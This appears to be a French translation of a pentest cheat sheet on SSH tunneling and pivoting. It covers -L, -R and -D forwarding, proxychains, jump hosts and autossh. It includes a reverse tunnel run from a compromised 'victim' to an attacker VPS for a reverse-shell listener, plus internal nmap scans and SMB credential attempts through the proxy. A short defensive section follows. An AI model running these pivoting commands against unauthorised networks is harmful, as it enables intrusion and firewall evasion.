<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Tunneling SSH et chaînes proxy - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p align="center">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="Tunneling SSH">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivot">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p align="center">
  <b>🚇 Référence complète pour les tunnels SSH locaux (-L), distants/inverses (-R) et Dynamic SOCKS (-D) avec intégration Proxychains-ng</b>
</p>

---

## 📋 Table des matières

- [Vue d'ensemble et architectures de tunneling](#-overview--tunneling-architectures)
- [Redirection de port local (`-L`)](#-local-port-forwarding--l)
  - [Syntaxe et mécanique](#syntaxe--mécanique)
  - [Transférer une interface Web interne](#forwarding-an-internal-web-interface)
  - [Transfert des ports de base de données distantes](#forwarding-remote-database-ports)
- [Redirection de port à distance/inverse (`-R`)](#-remote--reverse-port-forwarding--r)
  - [Syntaxe et mécanique](#syntax--mechanics-1)
  - [Exposition du gestionnaire de shell inversé local](#exposing-local-reverse-shell-handler)
  - [Relais du trafic entrant depuis la DMZ](#relaying-inbound-traffic-from-dmz)
- [Transfert dynamique SOCKS (`-D`)](#-dynamic-socks-forwarding--d)
  - [Syntaxe et configuration SOCKS5](#syntax--socks5-setup)
- [Configuration Proxychains-ng](#-proxychains-ng-configuration)
  - [Configuration de `/etc/proxychains4.conf`](#configuring-etcproxychains4conf)
  - [Routage des outils CLI via Proxychains](#routing-cli-tools-through-proxychains)
- [Hôtes de saut et de pivotement multi-sauts (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [Tunnels persistants avec Autossh](#-persistent-tunnels-with-autossh)
-[Séquences d'échappement SSH interactives (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et OPSEC](#-defensive-considérations--opsec)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et architectures de tunneling

SSH n'est pas simplement un client de terminal distant ; il s'agit d'une couche de transport de flux d'octets bidirectionnelle et chiffrée qui contourne les politiques restrictives de pare-feu de sortie/entrée :

1. **Redirection de port local (`-L`) :** ouvre un port d'écoute sur la **machine locale de l'attaquant** ; les connexions sont tunnelisées via SSH et transférées vers une destination accessible depuis le serveur SSH distant.
2. **Remote Port Forwarding (`-R`) :** Ouvre un port d'écoute sur le **serveur SSH distant** ; les connexions entrantes sont renvoyées par tunnel vers la machine locale ou la cible interne de l'attaquant.
3. **Redirection de port dynamique (`-D`) :** Transforme le client SSH en un proxy **SOCKS4/SOCKS5** local, permettant aux outils (Nmap, Burp Suite, Ffuf, Metasploit) d'acheminer le trafic TCP arbitraire sur le réseau distant.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 Redirection de port local (`-L`)

### Syntaxe et mécanique
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### Transfert d'une interface Web interne
Accédez à un panneau d'administration web sur `172.16.0.15:80` via le pivot `10.10.10.200` :
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Maintenant, accédez à `http://127.0.0.1:8080` dans votre navigateur local.*

### Transfert des ports de bases de données distantes
Accédez à une base de données PostgreSQL interne liée uniquement à `127.0.0.1:5432` sur le serveur distant :
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!NOTE]
> Drapeaux utilisés :
> - `-N` : Ne pas exécuter de commande shell distante (tunnel uniquement).
> - `-f` : Exécuté en arrière-plan immédiatement avant l'exécution de la commande.

---

## 🔄 Redirection de port à distance/inverse (`-R`)

### Syntaxe et mécanique
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### Exposition du gestionnaire de shell inversé local
À partir d'une machine cible compromise derrière NAT, franchissez les pare-feu sortants pour envoyer le trafic à votre écouteur externe sur VPS :
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### Relayer le trafic entrant depuis la DMZ
Transférer le port 8080 du pivot distant vers le port local 80 :
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!IMPORTANT]
> Pour lier les ports distants à toutes les interfaces (`0.0.0.0`), le `/etc/ssh/sshd_config` du serveur SSH doit définir :
> `GatewayPorts yes` ou `GatewayPorts clientspecified`.

---

## 🌐 Transfert dynamique SOCKS (`-D`)

### Syntaxe et configuration de SOCKS5
Créez un proxy SOCKS5 dynamique sur le port local `1080` :
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
Vérifiez que le proxy SOCKS écoute :
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Configuration des proxychains-ng

Proxychains intercepte les appels réseau de bibliothèque dynamique (`connect()`, `gethostbyname()`) via `LD_PRELOAD` pour forcer les applications CLI standard via des proxys SOCKS/HTTP.

### Configuration de `/etc/proxychains4.conf`
Modifiez le fichier de configuration pour qu'il pointe vers votre tunnel SSH Dynamic SOCKS :
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### Routage des outils CLI via des chaînes proxy
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 Hôtes pivotants et de saut multi-sauts (`-J`)

Lors du franchissement de plusieurs limites de pare-feu segmentées :
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 Tunnels persistants avec Autossh

Lorsque les tunnels SSH sont interrompus en raison d'un délai d'attente réseau ou d'une interruption NAT, `autossh` surveille et redémarre automatiquement la connexion SSH :
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ Séquences d'échappement SSH interactives (`~C`)

Si vous avez déjà une session SSH interactive ouverte et que vous devez soudainement ouvrir un transfert de port sans vous déconnecter :

1. Appuyez sur `Enter`
2. Tapez `~C` (Tilde suivi d'un C majuscule)
3. L'invite devient `ssh> `
4. Ajoutez vos règles de transfert à la volée :
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
Ou créez des SOCKS dynamiques :
   ```text
   ssh> -D 1080
   ```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **Redirection de port local** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Redirection de port à distance** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Proxy dynamique SOCKS5**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Tunnel silencieux en arrière-plan** | `ssh -f -N -D 1080 user@pivot` |
| **Sauter le pivot de l'hôte** | `ssh -J user@hop1,user@hop2 target` |
| **Exécuter l'outil via Proxychains** | `proxychains4 <TOOL> <ARGS>` |
| **Reconnexion automatique persistante** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **Tunnel à la volée** | `Enter` puis `~C` -> `ssh> -D 1080` |

---

## 🛡️ Considérations défensives et OPSEC

1. **Désactivez la redirection de port dans SSHD :** Définissez `AllowTcpForwarding no` et `PermitTunnel no` dans `/etc/ssh/sshd_config` sur des systèmes de production renforcés.
2. **Détection des anomalies de flux réseau :** Des sessions SSH persistantes de longue durée transférant d'importants flux d'octets bidirectionnels indiquent souvent un tunneling interactif ou une exfiltration de données.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> Le tunneling SSH et le pivotement de réseau ne doivent être effectués que sur des réseaux et des systèmes pour lesquels une autorisation écrite explicite a été obtenue. Le contournement non autorisé des pare-feu du réseau périmétrique est illégal.